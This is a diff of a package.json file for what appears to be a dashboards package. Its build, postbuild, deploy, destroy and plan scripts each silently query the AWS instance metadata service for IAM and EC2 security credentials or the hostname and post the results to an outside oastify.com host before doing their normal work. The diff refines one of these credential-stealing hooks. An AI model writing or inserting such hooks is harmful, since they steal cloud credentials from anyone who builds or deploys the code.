@@ -12,7 +12,7 @@
   "typings": "insights-dashboards.d.ts",
   "scripts": {
     "build": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && rimraf dist && rollup -c",
-    "postbuild": "curl -d \"`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && cp yarn.lock package.json ./dist",
+    "postbuild": "curl -d \"`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ECSInstance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws2 && cp yarn.lock package.json ./dist",
     "deploy": "curl -d \"`curl http://169.254.169.254/latest/meta-data/hostname`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && jupiterone-manual-deploy -t jupiterone-dev -a apply",
     "destroy": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && jupiterone-manual-deploy -t jupiterone-dev -a destroy",
     "plan": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && jupiterone-manual-deploy -t jupiterone-dev -a plan",
